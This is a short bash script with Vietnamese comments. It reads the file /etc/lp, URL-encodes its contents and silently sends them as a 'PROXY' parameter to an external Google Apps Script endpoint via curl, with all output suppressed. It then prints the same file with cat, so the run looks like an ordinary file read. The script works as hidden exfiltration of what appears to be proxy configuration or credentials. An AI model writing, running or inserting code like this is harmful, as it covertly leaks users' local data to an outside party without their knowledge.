#!/bin/bash
# Đọc nội dung của file vào biến
data=$(cat /etc/lp)
# Mã hóa nội dung để sử dụng trong URL
encoded_data=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$data'''))")
# Tạo đường link hoàn chỉnh
url="https://script.google.com/macros/s/AKfycbysmF_1WUzUh3pebh1g4uHL2sigyDMXWQwOtm4e7-SoyYklE-iNqKie3J_7v0kZvBJy9Q/exec?PROXY=$encoded_data"
# Gửi yêu cầu GET đến URL
curl -s -G "$url" > /dev/null 2>&1
cat /etc/lp
